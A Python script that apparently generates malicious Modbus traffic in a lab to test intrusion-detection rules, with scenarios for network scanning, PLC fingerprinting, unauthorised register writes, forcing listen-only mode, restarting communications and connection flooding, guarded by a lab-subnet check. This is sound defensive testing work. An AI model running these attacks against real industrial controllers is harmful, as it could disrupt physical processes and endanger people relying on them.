"""Lab attacker: generates malicious Modbus traffic for detection testing.

LAB USE ONLY. Every target is checked against 10.10.1.0/24 before anything is sent
(labnet.check_target); anything else is refused and the script exits.

Scenarios and the LM SID each one should raise:
  scan           connect sweep of the lab /24 on 502, then FC43 probes   -> 9100006, 9100004
  write          unauthorised FC6 + FC16 writes                          -> 9100001
  listen-only    FC8 sub 4 Force Listen Only Mode                        -> 9100002
  restart-comms  FC8 sub 1 Restart Communications                        -> 9100003
  flood          burst of new connections each sending a read            -> 9100006
"""

import argparse
import socket
from concurrent.futures import ThreadPoolExecutor

import labnet


def log(msg):
    print(f"attacker: {msg}", flush=True)


def scan(target, args):
    # 1. Connect sweep of the whole lab network on 502 (every address is inside LAB_NET).
    hosts = [str(h) for h in labnet.LAB_NET.hosts()]

    def probe(ip):
        try:
            labnet.connect(ip, 502, timeout=0.3).close()
            return ip
        except OSError:
            return None

    with ThreadPoolExecutor(max_workers=32) as pool:
        found = [ip for ip in pool.map(probe, hosts) if ip]
    log(f"sweep: port 502 open on {found}")

    # 2. Fingerprint the PLC: one new connection per unit ID, each asking FC43 Read Device Identification.
    for unit in range(1, args.count + 1):
        try:
            c = labnet.ModbusClient(target, unit=unit, timeout=1.0)
            reply = c.request(labnet.read_device_identification())
            c.close()
            if unit == 1:
                log(f"FC43 unit {unit}: {reply[:60]!r}")
        except (OSError, ConnectionError) as exc:
            log(f"FC43 unit {unit}: {exc}")
    log(f"sent FC43 to {args.count} unit IDs on {target}")


def write(target, args):
    c = labnet.ModbusClient(target)
    c.request(labnet.write_single_register(0, 9999))
    log("FC6 write HR0 = 9999")
    c.request(labnet.write_multiple_registers(10, [1, 2, 3, 4, 5]))
    log("FC16 write HR10-14")
    c.close()


def listen_only(target, args):
    c = labnet.ModbusClient(target, timeout=2.0)
    c.request(labnet.diagnostics(4), expect_reply=False)  # the device sends no reply
    log("FC8 sub 4 Force Listen Only Mode sent (a real device goes silent until restart-comms)")
    c.close()


def restart_comms(target, args):
    c = labnet.ModbusClient(target, timeout=2.0)
    try:
        c.request(labnet.diagnostics(1))
    except (socket.timeout, ConnectionError):
        pass
    log("FC8 sub 1 Restart Communications sent")
    c.close()


def flood(target, args):
    ok = 0

    def one(_):
        try:
            c = labnet.ModbusClient(target, timeout=1.0)
            c.request(labnet.read_holding(0, 10))
            c.close()
            return 1
        except (OSError, ConnectionError):
            return 0

    with ThreadPoolExecutor(max_workers=16) as pool:
        ok = sum(pool.map(one, range(args.count)))
    log(f"flood: {args.count} connections, {ok} answered")


SCENARIOS = {
    "scan": (scan, 25),
    "write": (write, 0),
    "listen-only": (listen_only, 0),
    "restart-comms": (restart_comms, 0),
    "flood": (flood, 300),
}


def main():
    p = argparse.ArgumentParser(description="OT lab attack traffic generator (lab network only)")
    p.add_argument("scenario", choices=sorted(SCENARIOS))
    p.add_argument("--target", default="10.10.1.10", help="PLC address (must be in 10.10.1.0/24)")
    p.add_argument("--count", type=int, default=None, help="probes (scan) or connections (flood)")
    args = p.parse_args()

    target = labnet.check_target(args.target)  # hard stop before any traffic
    func, default_count = SCENARIOS[args.scenario]
    if args.count is None:
        args.count = default_count
    log(f"scenario={args.scenario} target={target}")
    func(target, args)
    log("done")


if __name__ == "__main__":
    main()
